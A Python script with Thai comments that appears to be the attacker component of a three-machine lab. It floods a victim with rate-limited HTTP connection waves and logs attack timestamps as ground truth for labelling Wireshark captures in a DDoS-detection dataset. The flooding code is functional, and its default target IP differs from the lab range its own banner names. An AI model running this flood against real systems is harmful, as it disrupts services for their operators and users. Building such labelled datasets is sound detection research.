"""
สคริปต์สำหรับเครื่องที่ 3: Attacker (IP: 192.168.10.30)
หน้าที่:
1. จำลองการยิง DDoS (HTTP Flood / TCP SYN Connect Burst) ไปยังเครื่องที่ 1 (192.168.10.10)
   โดยควบคุมอัตราความเร็ว (Rate-limited) เพื่อไม่ให้การ์ดแลนค้าง
2. บันทึกเวลาเริ่มต้น (start_epoch) และเวลาสิ้นสุด (end_epoch) ลงไฟล์ `attack_ground_truth.csv` อัตโนมัติ
   เพื่อนำไปใช้ติดเฉลย (Label = 1) ให้กับ Time Window ของ Wireshark ได้ตรงระดับวินาที
"""

import os
import csv
import time
import socket
import argparse
import threading
from datetime import datetime


GROUND_TRUTH_FILE = os.path.join(os.path.dirname(__file__), "attack_ground_truth.csv")


def log_attack_window(wave_id: int, attack_type: str, start_epoch: float, end_epoch: float, packets_sent: int):
    """บันทึกช่วงเวลาที่ยิงโจมตีลงไฟล์ CSV อัตโนมัติ สำหรับใช้ทำเฉลย (Ground Truth Labeling)"""
    file_exists = os.path.exists(GROUND_TRUTH_FILE)
    with open(GROUND_TRUTH_FILE, mode="a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(["wave_id", "attack_type", "start_epoch", "end_epoch", "start_human", "end_human", "packets_sent"])
        writer.writerow([
            wave_id,
            attack_type,
            f"{start_epoch:.3f}",
            f"{end_epoch:.3f}",
            datetime.fromtimestamp(start_epoch).strftime("%Y-%m-%d %H:%M:%S"),
            datetime.fromtimestamp(end_epoch).strftime("%Y-%m-%d %H:%M:%S"),
            packets_sent,
        ])
    print(f"[Ground Truth Saved] บันทึกช่วงเวลาโจมตีลง {GROUND_TRUTH_FILE} เรียบร้อยแล้ว")


def flood_worker(target_ip: str, port: int, stop_event: threading.Event, counter: list, pps_per_thread: int):
    """เธรดยิง TCP SYN / HTTP Request ความถี่สูงแบบควบคุมอัตรา"""
    delay = 1.0 / max(1, pps_per_thread)
    payload = b"GET /?flood=1 HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\nConnection: close\r\n\r\n"

    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.15)
            s.connect((target_ip, port))
            s.sendall(payload)
            s.close()
        except Exception:
            pass
        counter[0] += 1
        time.sleep(delay)


def run_attack_wave(target_ip: str, port: int, wave_id: int, duration_sec: int, threads: int, pps_per_thread: int):
    print("\n" + "!" * 65)
    print(f"[Attacker] เริ่มยิง DDoS Wave #{wave_id} ไปยัง {target_ip}:{port}")
    print(f"[Attacker] จำนวน Threads: {threads} | ระยะเวลา: {duration_sec} วินาที")
    print("!" * 65)

    stop_event = threading.Event()
    counter = [0]
    workers = []

    start_epoch = time.time()
    print(f"[Timestamp] START_EPOCH = {start_epoch:.3f} ({datetime.fromtimestamp(start_epoch).strftime('%H:%M:%S')})")

    for _ in range(threads):
        t = threading.Thread(
            target=flood_worker,
            args=(target_ip, port, stop_event, counter, pps_per_thread),
            daemon=True,
        )
        t.start()
        workers.append(t)

    try:
        for elapsed in range(1, duration_sec + 1):
            time.sleep(1.0)
            print(f"  -> กำลังยิง DDoS... ผ่านไป {elapsed}/{duration_sec} วินาที (ส่งแล้ว {counter[0]:,} connections)")
    except KeyboardInterrupt:
        print("\n[Attacker] หยุดยิงก่อนกำหนดโดยผู้ใช้")

    stop_event.set()
    for t in workers:
        t.join(timeout=0.5)

    end_epoch = time.time()
    print(f"[Timestamp] END_EPOCH   = {end_epoch:.3f} ({datetime.fromtimestamp(end_epoch).strftime('%H:%M:%S')})")

    log_attack_window(
        wave_id=wave_id,
        attack_type="DDoS_Flood",
        start_epoch=start_epoch,
        end_epoch=end_epoch,
        packets_sent=counter[0],
    )


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DDoS Attacker Simulator with Auto Timestamp Ground-Truth Logger")
    parser.add_argument("--target", default="192.168.1.10", help="IP ของเครื่องที่ 1 (Victim)")
    parser.add_argument("--port", type=int, default=8000, help="พอร์ตเป้าหมาย")
    parser.add_argument("--waves", type=int, default=2, help="จำนวนรอบ (Waves) ที่ต้องการยิง")
    parser.add_argument("--attack-sec", type=int, default=15, help="ระยะเวลายิงต่อรอบ (วินาที)")
    parser.add_argument("--rest-sec", type=int, default=30, help="ระยะเวลาพักเป็นทราฟฟิกปกติระหว่างรอบ (วินาที)")
    parser.add_argument("--threads", type=int, default=10, help="จำนวน Threads ที่ใช้ยิง")
    parser.add_argument("--pps", type=int, default=25, help="จำนวนคำขอต่อวินาทีต่อ 1 Thread")
    args = parser.parse_args()

    print("=" * 65)
    print("  ชุดจำลองการยิง DDoS สำหรับเก็บ Dataset บนวง LAN ปิด (3 เครื่อง)")
    print("  คำเตือน: ใช้เฉพาะในวง LAN ปิด (192.168.10.x) เพื่อการศึกษาเท่านั้น")
    print("=" * 65)

    for w in range(1, args.waves + 1):
        run_attack_wave(
            target_ip=args.target,
            port=args.port,
            wave_id=w,
            duration_sec=args.attack_sec,
            threads=args.threads,
            pps_per_thread=args.pps,
        )
        if w < args.waves:
            print(f"\n[Rest Period] พักการโจมตี {args.rest_sec} วินาที เพื่อให้ Wireshark เก็บทราฟฟิกปกติ (Normal)...")
            time.sleep(args.rest_sec)

    print("\n[เสร็จสมบูรณ์] คัดลอกไฟล์ `attack_ground_truth.csv` ไปที่เครื่องที่ 1 เพื่อรัน step1_wireshark_to_features.py ได้เลย!")
